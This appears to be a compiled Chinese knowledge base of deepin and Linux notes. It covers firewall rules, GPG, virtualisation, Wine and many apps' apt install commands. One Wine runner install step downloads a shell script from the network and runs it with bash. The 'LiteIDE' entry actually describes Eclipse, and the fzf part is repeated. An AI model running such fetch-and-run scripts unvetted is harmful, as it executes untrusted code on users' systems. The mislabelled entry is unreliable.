iptables规则无真正语法，是命令行参数组合；nftables有语法，规则类似编程语句，如iptables的'iptables -A OUTPUT -p tcp --dport 80 -j DROP'对应nftables的'nft add rule ip filter output tcp dport 80 drop'。

iptables规则布局是数组式，删除元素需移动后续元素；nftables是链表式，删除只需修改指针。

iptables内核机制是固定机械装置，规则由matches和target组成，行为固定；nftables在Netfilter的5个HOOK点各有虚拟机，规则即程序，可组合基础动作实现各种操作。

nftables引入运算符、变量和数据结构，规则编写是编程过程，管理员成“编程者”；内核执行其编制的程序，无假定。

iptables规则集需遍历所有关联规则，性能受固定结构限制；nftables性能与编程者相关，可优化为多维树匹配。

iptables有5条链，对应PREROUTING、INPUT、OUTPUT、FORWARD、POSTROUTING五个钩子函数，数据包到达时检查链中规则。

iptables的表包括filter（包过滤）、nat（地址转换）、mangle（包修改）、raw（数据跟踪），优先级：raw-->mangle-->nat-->filter。

iptables常用操作命令：-A（链尾添加规则）、-D（删除匹配规则）、-I（插入规则）、-L/S（列出规则）、-F（删除所有规则）。

iptables目标动作：ACCEPT（允许通过）、DROP（丢弃）、REJECT（丢弃并发信息）、SNAT（源地址转换）、DNAT（目标地址转换）。

iptables保存规则用iptables-save > 文件名，恢复用iptables-restore < 文件名。

标题：GPG
GPG由自由基金会开发，因PGP是商业软件，GPG遵循OpenPGP标准，与PGP兼容。

Mac系统安装GPG的命令：brew install gpg。

Arch/Manjaro系统安装GPG的命令：sudo pacman -S gnupg。

Debian系统安装GPG的命令：sudo apt install gnupg。

生成GPG密钥可使用gpg --full-gen-key，需选择加密算法、密钥长度、有效期等。

快速生成GPG密钥可用gpg --gen-key，默认算法为RSA，有效期一年，comment为空。

生成GPG撤销密钥的命令：gpg --gen-revoke [uid]，用于密钥不再使用时撤销。

GPG加密文件命令：gpg -r [uid] -o file -e file，-r指定用户，-o指定输出文件。

添加-a选项可生成ASCII格式加密文件，如gpg -r test1 -a -e test.txt。

GPG解密文件命令：gpg -o file -d file，-o指定解密后输出文件，-d指定待解密文件。

GPG二进制签名命令：gpg --sign test.txt，生成test.txt.gpg。

GPG ASCII签名用gpg --clearsign test.txt，生成test.txt.asc，含源文件内容和签名。

签名与加密同时进行的命令：gpg -u test1 -r test1 -se test.txt，-u指定签名用户。

分离签名文件用gpg -b test.txt，生成test.txt.sig单独签名文件。

验证GPG签名的命令：gpg --verify test.txt.sig，可验证签名正确性。

标题：Linux如何使用nftables作为防火墙
nftables是Linux中新的包过滤前端命令行，用于替代iptables，其命令是nft，系统中若无，可安装nftables软件包，如sudo apt install nftables。

使用nftables作为防火墙，需先创建名为inet的规则表，命令为nft add table inet filter。

向inet表添加input、forward、output链，分别绑定到对应挂钩点，优先级0，默认规则accept，如input链命令：nft add chain inet filter input { type filter hook input priority 0 ; policy accept ; }。

允许其他设备通过wlp3s0接口访问本机SSH服务的命令为nft add rule inet filter input iif wlp3s0 tcp dport 22 accept。iif指输入接口，可用ifconfig或ip addr show查看接口名称。

拒绝通过wlp3s0接口的input方向新连接的命令为nft add rule inet filter input iif wlp3s0 ct state new reject。ct state new表示新建连接，iif条件不能省略。

阻止其他设备访问本机容器内的服务，需在forward方向禁止新连接，命令为nft add rule inet filter forward iif wlp3s0 ct state new reject，iif条件不可省略。

列出现有防火墙规则的命令是nft list ruleset -a，-a参数显示handle（规则序号），table ip和ip6是iptables和ip6tables创建的。

删除inet表可通过其handle，命令为nft delete table handle [handle值]，handle可从nft list ruleset -a中获取。

删除单条规则需指定链和handle，如删除input链中handle为4的规则，命令为nft delete rule inet filter input handle 4。

完整脚本会刷新现有规则，先删除现有inet表，再添加新规则（创建表、链及相关规则），执行脚本即可生效。

通过systemd让脚本开机自启动，需创建/usr/local/bin/nftables.sh脚本和/etc/systemd/system/nftables.service文件，再执行sudo systemctl enable nftables。

标题：Gufw
Gufw是一款防火墙UFW的图形化管理工具，可以保护您的电脑在接入互联网时免受病毒干扰。其全中文的操作界面，可以方便的设置放行/阻止IP或服务，非常适合对系统完全性要求较高的商务电脑使用。安装命令为sudo apt-get install gufw，卸载命令为sudo apt-get remove gufw，仓库地址是http://packages.deepin.com/deepin/pool/main/g/gui-ufw/

标题：FF_Multi_Converter
FF Multi Converter是一个多功能的格式转换工具，它支持音频，视频，图像等格式之间的相互转换，以及选择文件预设，它将自动填充相应的转换命令。安装命令为sudo apt-get install ffmulticonverter，卸载命令为sudo apt-get remove ffmulticonverter，其仓库地址为http://packages.deepin.com/deepin/pool/main/f/ffmulticonverter-dmo/

标题：HandBrake
HandBrake是一款视频转码工具，它可以转换常见的视频文件或将DVD、蓝光视频转换成MP4和MKV，同时还可以自定义转换参数，如定制视频大小、视频裁切、滤镜、视音频编解码器、字幕、章节等参数。

安装命令：sudo apt-get install handbrake

卸载命令：sudo apt-get remove handbrake

仓库地址：http://packages.deepin.com/deepin/pool/main/h/handbrake/

标题：CopyQ
CopyQ是一款剪贴板软件，适用于大量数据的复制粘贴。CopyQ能快速复制大量的连续表格数据，具有搜索，编辑历史等一些高级功能，并且还支持图片、命令行、快捷键等。安装命令为sudo apt-get install copyq，卸载命令为sudo apt-get remove copyq，其仓库地址为http://packages.deepin.com/deepin/pool/main/c/copyq/

标题：Poedit
Poedit 是一款基于多语言的本地化工具，支持 Win/Mac/Linux 三大主流平台，经常被用于本地化各种计算机软件，以及翻译 WordPress 主题或插件。Poedit 支持开源及跨平台的 gettext类（.po 格式，使用 gettext 作为程序的本地化），以及可以直接对接世界范围内最主流的翻译服务平台 Crowin，是目前同类软件中使用最为广泛的优秀工具。安装命令：sudo apt-get install poedit。卸载命令：sudo apt-get remove poedit。仓库地址：http://packages.deepin.com/deepin/pool/main/p/poedit/

标题：GoldenDict
GoldenDict是一款词典软件，支持多种词典文件格式。GoldenDict可以查询Wikipedia、Wiktionary 等基于 MediaWiki 的Wiki网站，格式化、颜色、图像、链接等支持一应俱全，且能够通过模板化URL模式来使用其他的在线词典网站。

安装命令：sudo apt-get install goldendict；卸载命令：sudo apt-get remove goldendict。

GoldenDict的仓库地址是http://packages.deepin.com/deepin/pool/main/g/goldendict/。

标题：有道词典
有道词典是中国第一个基于Linux下的互联网商业翻译软件，是网易有道与武汉深之度科技有限公司联合开发的。有道词典Linux版可以实现多语言的精准翻译，支持原声发音和智能屏幕取词与划词、图解词典等功能。安装命令为sudo apt-get install youdao-dict，卸载命令为sudo apt-get remove youdao-dict。其仓库地址为http://packages.deepin.com/deepin/pool/non-free/y/youdao-dict/，相关链接包括deepin官网介绍https://www.deepin.org/cooperative/youdao-dict/

标题：Synapse
Synapse是一款使用Vala语言编写的启动器软件，它可以为用户更容易找到喜欢的应用程序，同时快速的打开所需的文件，还可以搜索桌面文件、支持输入命令。安装Synapse可以使用命令sudo apt-get install synapse，卸载则使用sudo apt-get remove synapse。其仓库地址为http://packages.deepin.com/deepin/pool/main/s/synapse/

标题：uTools
uTools是新一代效率工具平台，可自由组合插件应用，打造专属工具集。在任何界面下通过快捷键「Alt + 空格」呼出uTools，或是点击鼠标中键呼出超级面板，具有即用即走、无打扰、不中断当下工作的特点。安装命令为sudo apt install u.utools.utools，卸载命令为sudo apt remove --purge u.utools.utools。仓库地址为http://packages.deepin.com/deepin/pool/non-free/u/utools/，官网地址为https://u.tools/

标题：PyRenamer
pyRenamer是一款文件批量改名工具。支持匹配模式、查找替换、插入删除等方式修改名称。还可以根据照片的 EXIF信息和音乐的ID3标签来更改文件名。安装命令为sudo apt-get install pyrenamer，卸载命令为sudo apt-get remove pyrenamer，其仓库地址为http://packages.deepin.com/deepin/pool/main/p/pyrenamer/

标题：Catfish
Catfish是一个文件搜索工具，它支持搜索文档、图像、音乐、视频等文件类型，同时还可以选择搜索方法，设定不同的搜索条件并对搜索结果执行相应操作。安装命令为sudo apt-get install catfish，卸载命令为sudo apt-get remove catfish，仓库地址是http://packages.deepin.com/deepin/pool/main/c/catfish/

标题：FSearch
FSearch 是一款快速的文件搜索工具，灵感来自于 Everything 搜索引擎。它是用 C 语言编写的，基于GTK3。安装命令为 sudo apt install io.github.fsearch，卸载命令为 sudo apt remove --purge io.github.fsearch。官方仓库的版本只有英文版。自定义搜索范围（添加或排除某些目录）的方法是进入 Edit 菜单-> Preferences -> Database 选项卡，Include（包含）表示这些目录在搜索范围内，Exclude（不包含）表示这些目录被排除在搜索范围外。FSearch Github 主页是 https://github.com/cboxdoerfer/fsearch。

标题：fzf使用说明
fzf 是一个命令行下对文件或者文件内容过滤的工具。它有着高效的性能，简单易用。不过要结合其他工具，才能获得最大的收益。

网上很多 fzf 的说明都是针对 zsh 这个 shell 来说明配置方法。但是我不用这个 shell，而是用系统自带的 bash shell。

在系统中安装fzf的bash命令为：sudo apt install fzf

默认输入fzf可以正常执行这个搜索过滤程序，它会调用find作为输入，即当前目录下的文件会被搜索。

若想在“cat xxx”这类命令的参数位置，用fzf找到目标文件，需要绑定按键，用来调用fzf。

fzf按键绑定的样板文件位于/usr/share/doc/fzf/examples目录下，相关操作命令如下：cd ；cp /usr/share/doc/fzf/examples/key-bindings.bash .；echo source key-bindings.bash >> .bashrc；. bashrc。

绑定按键后，按ctrl + t可调出fzf搜索文件名，按alt + c可搜索目录并选择进入。

fzf使用说明的参考资源如下：1. 标题为“FZF：终端下的文件查找器【猛男必备233333】”，链接为https://www.bilibili.com/video/av80254519；2. 标题为“Bash readline 使用技巧”，链接为http://www.kerneltravel.net/newbie/bash_readline.htm。

sudo apt install fzf

默认输入 fzf 可以正常执行这个搜索过滤程序，它会调用 find 作为输入，即当前目录下的文件会被搜索。

这种使用方式很无趣，比如我们想在参数位置，输入一个我们找到的文件，如： cat xxx。 想实现这个要绑定按键，用来调用 fzf。

这个绑定的操作其实有一个样板，在/usr/share/doc/fzf/examples里面：

然后就可以用 ctrl + t 调出 fzf 搜索文件名了。

另外： alt + c : 搜索目录，并选择进入

标题：Tickeys
Tickeys是一款打字机声效模拟软件，它支持进行设置声音方案（自带打字机、冒泡、机械键盘、剑气等方案）、音量、音调等，让您的键盘加上特效声音。安装命令为sudo apt-get install tickeys，卸载命令为sudo apt-get remove tickeys，其仓库地址为http://packages.deepin.com/deepin/pool/contrib/t/tickeys/

标题：KShutdown
KShutDown是一个定时关机工具，使用它你可以在指定的时间实现对于系统的关闭、重启、锁屏、以及结束会话等操作。同时具有可配置的键盘快捷键、KDE Kiosk支持、命令行和DCOP支持等功能。安装命令为sudo apt-get install kshutdown，卸载命令为sudo apt-get remove kshutdown，仓库地址是http://packages.deepin.com/deepin/pool/main/k/kshutdown/

标题：Geekbench
Geekbench 是一款跨平台的跑分软件，评分可分为单核和多核性能，以及模拟真实使用场景的工作负载能力。目前最新版本是 Geekbench 5。软件基准测试适用于 macOS、Windows、Linux、Android和iOS。运行测试可通过以下命令：wget https://cdn.geekbench.com/Geekbench-5.4.5-Linux.tar.gz；tar -xzvf Geekbench-5.4.5-Linux.tar.gz；Geekbench-5.4.5-Linux/geekbench5。

标题：随机_LSICDS
目录挂载点是指将一个存储设备或分区与文件系统中的某个目录关联起来，使得该存储设备或分区能够被系统访问。常见的挂载命令有mount和umount，mount命令用于临时挂载，umount用于卸载已挂载的设备。永久挂载需要配置/etc/fstab文件，该文件记录了系统启动时需要自动挂载的文件系统信息。

挂载点的选择通常遵循一定的规范，例如根目录/是所有文件系统的起点，/mnt常用于临时挂载额外的文件系统，/media则多用于挂载可移动设备如U盘、光盘等。在挂载前需确保挂载点目录已存在，否则需要使用mkdir命令创建。

标题：Genymotion
Genymotion是一款专业的虚拟模拟器，可以在您的电脑上运行安卓应用、游戏或者智能电视应用等，同时它也是开发人员使用的开发工具，还可以调试已开发的程序。安装命令为sudo apt-get install genymotion，卸载命令为sudo apt-get remove genymotion，其仓库地址为http://packages.deepin.com/deepin/pool/contrib/g/genymotion/

标题：UEngine运行器
新版本Deepin/UOS发布后，可以在应用商店安装部分官方已适配的安卓应用，对爱好者来说，不能自己安装APK软件包始终差点意思，本程序可以为Deepin/UOS上的UEngine安卓运行环境安装自定义APK软件包，并能发送安装的APK包启动菜单到桌面或系统菜单。

更新内容：※1、修复在 APK 详细信息中图标可能过大导致无法正常使用的问题；※2、修复 APK 路径带空格无法正常安装的问题；3、修复打包器打包的 APK 带下划线“_”无法正常打包的问题；4、修复打包器下方命令返回过多空白行的问题；5、修复程序生成的默认图标任然是旧版图标的问题。

下载链接：UEngine 运行器，蓝奏云：https://gfdgdxi.lanzoui.com/b01oaxnbi，密码：2rh3；Github：https://github.com/gfdgd-xi/uengine-runner；Gitee：https://gitee.com/gfdgd-xi/uengine-runner；Gitlink：https://gitlink.org.cn/gfdgd_xi/uengine-runner；星火应用商店（已审核通过）：spk://store/tools/spark-uengine-runner；UEngine 运行器内部更新：可以使用 UEngine 运行器自带的更新程序进行更新（只支持 1.6.0 及以上版本）。

现在新增了通过包名值获取应用适配情况的功能，查看链接：https://gfdgd-xi.github.io/uengine-runner-info/，如何贡献自己的适配情况？在 UEngine 运行器进行评分即可。最后再说一句：双包合一，所以即使你是安装 UEngine 运行器旧包的，也必须安装 UEngine 运行器新包，旧包已经废弃！

标题：Deepin-wine
容器就是win32程序运行的环境，可以理解为一个极小的windows，在Linux下面实际对应一个文件目录，如QQ对应的容器目录是~/.deepinwine/Deepin-QQ。创建容器最简单实用的方法就是将deepin维护的容器拷贝一份，如将QQ的容器拷贝一份到用户目录：cp -r ~/.deepinwine/Deepin-QQ ~/.bottle。创建一个干净的容器可以用如下命令：WINEPREFIX=~/.bottle deepin-wine winecfg 。但是这样可能会有一些字体乱码的问题。

只通过deepin-wine *.exe 可以运行程序，但是默认通过~/.wine的容器运行，~/.wine是wine默认生成的干净的容器，没有适配应用运行可能会有一些问题，所以最好通过上一步创建好的容器，可以每一个应用对应一个容器，不同的应用可能会需要不同的配置。通过WINEPREFIX的环境变量可以指定容器运行程序。如：WINEPREFIX=~/.bottle deepin-wine *.exe

简单的分析程序运行出现的问题，可以打开deepin-wine输出日志的通道，通过WINEDEBUG环境开关。如： WINEDEBUG=+pid,+tid,+process WINEPREFIX=~/.bottle deepin-wine *.exe

更新deepin-wine-helper：sudo apt-get update && sudo apt-get install deepin-wine-helper。更新到最新，/opt/deepinwine/tools/sendkeys.sh中有　$3 control mode , default ctrl+alt　这行注释就可以。确认需要设置快捷键的进程名和快捷键。如果不清楚需要设置的快捷键组合是什么，可以在设置中找到。如打开微信的快捷键是　ctrl+alt+W。进程名就是运行的exe的名字，可以用深度系统监视器查看。程序运行之后可以在监视器中找到对应的进程->右键菜单中选择属性->查看命令行的信息可以看出进程名。如微信的进程名是:  WeChat。

启动快捷键是通过/opt/deepinwine/tools/sendkeys.sh脚本运行，第一个参数是快捷键的键值，目前只支持字母，第二个参数是进程名，第三个参数是控制键的组合。详细说明参考/opt/deepinwine/tools/sendkeys.sh的注释。如打开微信的快捷键就可以写成：/opt/deepinwine/tools/sendkeys.sh w WeChat 4。程序运行的情况下，在终端运行脚本验证脚本是否有效。

在deepin的控制中心中添加自定义的快捷键。名称：自己随意填。命令：填上面验证过的命令，如：/opt/deepinwine/tools/sendkeys.sh w WeChat 4。快捷键：输入自己方便的组合，不一定要和程序中设置的一致。已知问题，微信截图的快捷键　alt+a 没有效果，可以在微信中将截图的快捷键改为　Ctrl+a，对应的脚本命令就是：/opt/deepinwine/tools/sendkeys.sh a WeChat 2。

标题：Wine 运行器
Wine运行器是一个能让Linux用户更加方便地运行Windows应用的程序，内置了对Wine图形化的支持、各种Wine工具、自制的Wine程序打包器和运行库安装工具等。

Wine运行器内置了基于VirtualBox制作的、专供小白使用的Windows虚拟机安装工具，可以做到只需下载系统镜像并点击安装即可，无需考虑虚拟机的安装、创建、分区等操作。

Wine运行器简化了命令“env WINEPREFIX=容器路径 wine（wine的路径） 可执行文件路径”，让用户更简便地使用Wine。

Wine运行器的打包器可将Wine容器打包成deb包，其创建的deb构建临时文件夹包含/XXX、DEBIAN（含control文件）、opt等目录，共11个目录和6个文件。

Wine运行器是使用Python3的PyQt5构建的，测试平台包括deepin 20.8、UOS 家庭版 21.3.1、Ubuntu 22.04、优麒麟 22.04、deepin 23、openkylin。

Wine运行器更新日志第1项：支持使用 Qemu + Chroot 跨运行 Wine 以及指定程序的功能。

Wine运行器更新日志第11项：新增 Vkd3d Proton 安装功能，更新 dxvk 版本至 2.0.0。

Wine运行器运行器使用说明：使用终端运行该程序，可以看到 wine 以及程序本身的提示和报错。

Wine运行器运行器使用说明：wine 32 位和 64 位的容器互不兼容。

Wine运行器运行器使用说明：所有的 wine 和 winetricks 均需要自行安装，可从菜单栏=>程序里面进行安装。

Wine运行器运行器使用说明：支持带参数运行 wine 程序，格式为“exe路径\' 参数 \'”（单引号需要输入）。

Wine运行器运行器使用说明：wine 容器如果没有指定，则会默认为 ~/.wine。

Wine运行器打包器使用说明：deb 打包软件包名只能含小写字母(a-z)、数字(0-9)、加号(+)、减号(-)、点号(.)，最短2个字符，且必须以字母开头。

Wine运行器打包器使用说明：输入可执行文件的运行路径时需以“C:/XXX/XXX.exe”格式，默认以C：开头，用“/”做分隔。

Wine运行器在Openkylin的安装方法：先添加源（Gitlink源脚本：wget https://code.gitlink.org.cn/gfdgd_xi/gfdgd-xi-apt-mirrors/raw/branch/master/sources/gitlink.sh && bash gitlink.sh && rm gitlink.sh；Github源脚本：wget https://gfdgd-xi.github.io/gfdgd-xi-apt-mirrors/sources/github.sh && bash github.sh && rm github.sh），再执行sudo apt install spark-deepin-wine-runner。

Wine运行器的下载链接包括Gitee：https://gitee.com/gfdgd-xi/deep-wine-runner、Github：https://github.com/gfdgd-xi/deep-wine-runner、Gitlink：https://www.gitlink.org.cn/gfdgd_xi/deep-wine-runner、蓝奏云：https://gfdgdxi.lanzouj.com/b01nz7y3e（密码:7oii）。

Wine运行器的注意事项：商业环境使用需保证获得相关厂家授权或移除相关组件（用程序自带的删除组件功能）。

Wine运行器新增通过SHA1值获取应用适配情况的功能，查看链接：https://gfdgd-xi.github.io/wine-runner-info/，贡献适配情况可在Wine运行器进行评分。

Wine运行器是一个能让Linux用户更加方便地运行Windows应用的程序，内置了对Wine图形化的支持、各种Wine工具、自制的Wine程序打包器和运行库安装工具等。它同时还内置了基于VirtualBox制作的、专供小白使用的Windows虚拟机安装工具，可以做到只需下载系统镜像并点击安装即可，无需考虑虚拟机的安装、创建、分区等操作。

打包器可以方便的把您的wine容器打包成deb包供他人使用，程序创建的deb构建临时文件夹目录树包含DEBIAN/control文件，opt/apps/XXX目录结构，以及entries应用程序入口和files容器文件。

在Openkylin安装需先添加作者源，通过Gitlink或Github源安装spark-deepin-wine-runner包。程序官网为https://gfdgd-xi.github.io/，支持蓝奏云、星火应用商店等多种下载方式。

商业环境使用需获得相关授权，非X86架构稳定性有限，可通过SHA1值获取应用适配情况：https://gfdgd-xi.github.io/wine-runner-info/。

标题：Wine介绍
Wine （“Wine Is Not an Emulator” 的首字母缩写）是一个能够在多种 POSIX-compliant 操作系统（诸如 Linux，macOS 及 BSD 等）上运行 Windows 应用的兼容层。 Wine 不是像虚拟机或者模拟器一样模仿内部的 Windows 逻辑，而是將 Windows API 调用翻译成为动态的 POSIX 调用，免除了性能和其他一些行为的内存占用，让你能够干净地集合 Windows 应用到你的桌面。

安装命令：sudo apt-get install wine；卸载命令：sudo apt-get remove wine

仓库地址：http://packages.deepin.com/deepin/pool/main/w/wine/

常见问题：1. 百度盘下载文件的位置在哪里? /home/用户名/.deepinwine/Deepin-BaiduNetDisk/drive_c/BaiduNetdiskDownload；2. 如何判断软件是否需要wine来启动? 一般软件在介绍的时候都会说明的, 有时候一款软件有linux原生和wine两个版本, 要注意区分，大多数windows平台的软件需要安装到linux平台时都需要借助wine

标题：Deepin环境如何执行exe文件
在桌面右键菜单点击在终端打开，然后输入wine，发现不是有效的命令。在应用商店发现了这么一个应用：PlayOnLinux。安装了之后在终端就可以使用wine指令了：然后只要在终端里面输入 wine ×××.exe 也就是你需要执行的exe的文件名以及后缀，就可以执行exe文件了。运行之后开始菜单貌似会出现相应的图标，可以选择发送到桌面，然后以后就可以自由的双击使用了。右键点击exe文件，打开方式选择“wine助手”，安装应用即可。

标题：Wine开发中的常用命令介绍
编译这个词我们大家经常在用，笼统的来说就是将源码变成可执行的程序。实际上在 Linux 中我们用的比较多的通常是编译套件，比如 GCC，它包括各种语言的编译器、汇编器、链接器等等。有了编译套件我们能够将源码变成可执行的程序，但是由于大的项目通常涉及成百上千的源文件，手动写脚本来完成这些繁琐的编译、链接工作太耗时，某个改动后想做到重新生成的代价最小则更是难上加难，所以出现了构建系统。最基础和常见的构建系统是 Make，它拥有一套语法，可以定义文件生成的规则，以及文件之间的依赖关系，项目中的 Makefile 文件通常就是包含了这些规则的文件。对于大的项目来说 Makefile 文件的编写也不是太容易，所以人们总结出了一套准则，提供了更高一级的抽象，用更高级的工具来生成 Makefile 文件。这些更高级的构建工具包括 GNU autotools、CMake 等，以 autotools 为例：开发人员通常编写 configure.ac 文件和 Makefile.am 文件，通过 autoconf 和 automake（autoreconf 可以全部生成），生成对应的 configure 脚本和 Makefile.in 文件。用户根据具体需求，通过不同的参数运行 ./configure 脚本生成 Makefile 文件。最后再用 make 命令，生成最终的可执行程序。遵循标准的 Makefile 文件一般还会存在 install 、uninstall 等目标，用来实现安装和卸载等功能。至此，我们完成了从源码到程序的构建。

不同的操作系统，或者说 Linux 下不同的发行版，通常都有自己的一套标准的软件安装方式，可以用来追踪安装的软件，保证软件来源的一致性和可靠性。Deepin 系统基于 Debian 系统而来，使用了和 Debian 系统一样的包管理系统（Ubuntu 也是基于 Debian 的包管理系统）。所谓打包就是将一系列的文件按照一致的规则收集到一起，以用于方便的安装、升级、卸载和配置的过程，打包最终生成的文件以 .deb 结尾，我们可以通过 dpkg -i  命令来安装。复杂的安装包通常都存在依赖关系，使用 dpkg 系列命令时我们需要了解对应的依赖关系是否满足。而 apt 系列命令，是更高一级的包管理系统，它包含了对依赖的解析和自动解决依赖的功能，所以可以简单的认为，dpkg 系列命令是用来操作单个包的，而 apt 系列命令是用来和包管理系统交互的。常见的 dpkg 和 apt 系列命令如下：dpkg，通过 -i、-r、-l、-S 参数可以安装、移除、查看安装包或者进行文件溯源。dpkg-deb，用来查看、解开或者打包安装包。apt install/remove/purge/update/dist-upgrade，来安装、移除软件包，以及系统的包索引更新和系统完整的升级。apt-cache show/policy/madison/depends/rdepends，可以用来查看包、当前安装策略、可用安装包、依赖包和被依赖包等信息。简单来说，在开发阶段通常都是先使用 dpkg 相关命令来测试，最终在用端一般只会使用 apt 相关命令。关于打包的具体过程，存在许多方法不同，这部分可以参考详细的文档，因此这里不在赘述。

可执行程序在终端中可以直接执行运行，运行的结果或者日志，通常以标准输出或者标准错误输出的形式输出到控制台，我们可以灵活的使用 shell 中各种重定向功能将日志保存到文件中。比如：wine xxx.exe &> log，将标准输出和标准错误都重定向到文件中。其他可能常用的命令：用 ps 命令来查看当前运行的进程。用 kill 命令给指定进程发送信号。用 top 命令查看当前系统的负载。用 netstat 或者 ss 查看当面网络链接情况。用 tar、unzip、unrar、7z 等命令来创建或者解压压缩文件。用 grep 命令在指定文件或者文件夹中搜索字符串。最重要的是，学会通过 man 命令来学习其他命令的使用。

标题：Bochs
Bochs（发音：box）是以GNU宽通用公共许可证发放的开放源代码的x86、x86-64 IBM PC兼容机模拟器和调试工具，支持处理器（包括保护模式）、内存、硬盘、显示器、以太网、BIOS、IBM PC兼容机的常见硬件外设的仿真。

Bochs主要用于操作系统开发（当模拟操作系统崩溃，它不崩溃主机操作系统，所以可以调试仿真操作系统）和在主机操作系统运行其他来宾操作系统。它也可以用来运行不兼容的旧的软件（如电脑游戏）。

Bochs的优点在于能够模拟跟主机不同的机种，例如在SPARC系统里模拟x86，但缺点是它的速度却慢得多。

Bochs的安装命令为sudo apt install bochs，卸载命令为sudo apt remove --purge bochs。

Bochs的仓库地址是http://packages.deepin.com/deepin/pool/main/b/bochs/，相关链接包括维基百科：https://zh.wikipedia.org/zh-cn/Bochs和Bochs官方网站：https://bochs.sourceforge.io/

标题：Boxes
Boxes(gnome-boxes)是一个桌面虚拟化管理工具，能够与其他系统（可以是虚拟的、本地的、远程的系统）上执行的应用程序相交互，还能够连接、访问和使用远程机器、远程虚拟机、本地虚拟机，而且还支持访问可移动设备中的虚拟机。

安装命令为sudo apt-get install boxes，卸载命令为sudo apt-get remove boxes。

Boxes的仓库地址是http://packages.deepin.com/deepin/pool/main/b/boxes/，官方网站是https://apps.gnome.org/zh-CN/app/org.gnome.Boxes/。

标题：VMware_Workstation
VMware Workstation是一款桌面虚拟计算机软件，提供用户在单一的桌面上同时运行不同的操作系统，和进行开发、测试 、部署新的应用程序的最佳解决方案。还可以在实体机器上以及可便于携带的虚拟机器中模拟完整的网络环境，同时还具有实时快照、拖曳共享文件夹、支持 PXE 等功能。

安装命令：sudo apt-get install vmware-workstation-install；卸载命令：sudo apt-get remove vmware-workstation-install

仓库地址：http://packages.deepin.com/deepin/pool/non-free/v/vmware-workstation-install/；官方网站：https://www.vmware.com

标题：VirtualBox
Oracle VM VirtualBox是一款开源的虚拟机软件，它可以虚拟化安装Windows、Mac OSX、Linux、OpenBSD、Solaris等系统。安装命令为sudo apt-get install virtualbox，卸载命令为sudo apt-get remove virtualbox。其仓库地址为http://packages.deepin.com/deepin/pool/main/v/virtualbox/，官方网站是https://www.virtualbox.org/。

标题：使用KVM虚拟机并配置桥接网络
在deepin下使用KVM虚拟机，首先需安装所需软件包，命令为：sudo apt-get install qemu-kvm libvirt-clients libvirt-daemon-system

安装KVM相关软件包后，需将当前用户添加到libvirt用户组，命令为：sudo adduser uos libvirt，其中需将uos替换成自己的用户名，目的是使当前用户可直接管理虚拟机无需提权

验证当前用户是否可以管理KVM虚拟机的命令是：sudo virsh list --all

管理KVM虚拟机的图形界面工具是virt-manager，通过命令sudo apt-get install virt-manager安装，安装后可在应用程序菜单找到该工具

配置KVM桥接网络的第一步是安装开启桥接接口所需工具，命令为：sudo apt-get install bridge-utils

安装bridge-utils后，可使用brctl命令管理桥接接口，创建名为br0的桥接接口命令为sudo brctl addbr br0，查看系统所有桥接接口命令为sudo brctl show

将物理网卡接口加入br0桥接接口的命令为sudo brctl addif br0 enp0s25，其中需将enp0s25替换成自己的网络接口名称

执行sudo brctl show命令可查看物理网卡接口是否已加入br0，若输出中br0对应的interfaces列显示enp0s25，则说明已加入

配置桥接接口IP和网关的步骤：1.删除物理网卡IP：sudo ip addr del dev enp0s25 192.168.1.8/24（替换接口和IP）；2.添加IP到br0：sudo ip addr add 192.168.1.8/24 dev br0（替换IP）；3.开启br0：sudo ip link set up br0；4.添加默认网关：sudo route add default gw 192.168.1.1（替换网关）

在virt-manager中配置虚拟机为桥接模式，需将虚拟机网络设置为创建的br0桥接接口，同时需执行命令iptables -A FORWARD -p all -i br0 -j ACCEPT开启转发

恢复网络原状态的命令：1.关闭br0：sudo ip link set br0 down；2.删除br0中的物理网卡：sudo brctl delif br0 enp0s25；3.关闭物理网卡：sudo ip link set enp0s25 down；4.重启物理网卡：sudo ip link set up enp0s25

KVM桥接网卡静态IP配置示例：auto lo
iface lo inet loopback
auto br0
iface br0 inet static
bridge_ports enp5s0f0
address 10.8.10.12
netmask 255.255.255.0
gateway 10.8.10.1
bridge_stp off
bridge_fd 0
bridge_maxwait 0

标题：Android Studio
Android Studio是一个基于IntelliJ IDEA的Android集成开发环境，它提供了集成的Android开发工具用于开发和调试，同时支持Android特定重构和快速修复，对程序性能、可用性、版本兼容和其他问题进行控制捕捉，支持ProGuard和应用签名功能，自带布局编辑器等功能。安装命令为sudo apt-get install android-studio，卸载命令为sudo apt-get remove android-studio，其仓库地址为http://packages.deepin.com/deepin/pool/main/a/android-studio/

标题：Anjuta
Anjuta是一个C、C++的集成开发环境。它具有很好的编程属性，其中包括项目管理、应用开发、交互调试以及强大的代码编辑和语法高亮显示等功能。安装命令为sudo apt-get install anjuta，卸载命令为sudo apt-get remove anjuta，其仓库地址为http://packages.deepin.com/deepin/pool/main/a/anjuta/

标题：Code::Blocks
Code::Blocks是一个开源、免费、跨平台的C++ IDE，具有可扩展插件向导功能，让你很方便的创建自己的插件。Code::Blocks是用C++编写的（用wxWidgets库），捆绑了MinGW编译器。安装命令：sudo apt-get install codeblocks。卸载命令：sudo apt-get remove codeblocks。仓库地址：http://packages.deepin.com/deepin/pool/main/c/codeblocks/

标题：CodeLite
CodeLite是一个C/C++编程语言的跨平台IDE，在Windows、Ubuntu和MacOSX各操作系统上均被测试。同时CodeLite的源代码使用是遵循GPL v2许可证的。安装命令为sudo apt-get install codelite。卸载命令为sudo apt-get remove codelite。仓库地址是http://packages.deepin.com/deepin/pool/main/c/codelite/

标题：LiteIDE
Eclipse是一个开源的集成开发环境（IDE），最初主要用于Java语言开发，通过安装不同的插件可以支持C/C++、Python、PHP等多种编程语言开发。它具有代码补全、语法高亮、调试等功能。安装命令：sudo apt-get install eclipse。卸载命令：sudo apt-get remove eclipse。仓库地址：http://packages.deepin.com/deepin/pool/main/e/eclipse/

标题：Brackets
Brackets是一个HTML/CSS/JavaScript前端WEB集成开发环境，它提供了快捷键设置、快速编辑、实时预览、代码隐藏与搜索、界面优化、内建取色器、代码/样式扩展等功能。安装命令为sudo apt-get install brackets，卸载命令为sudo apt-get remove brackets，仓库地址是http://packages.deepin.com/deepin/pool/non-free/b/brackets/

标题：Intel_XDK
Intel XDK是一款HTML5跨平台集成开发工具，利用HTML5的技术可以快速开发应用或者游戏，并快速打包成诸如安卓，IOS，WindowsPhone等平台上的应用并发布到应用商店，可谓是一条龙服务了，并有crosswalk做支持，在设备上运行起来也更流畅。

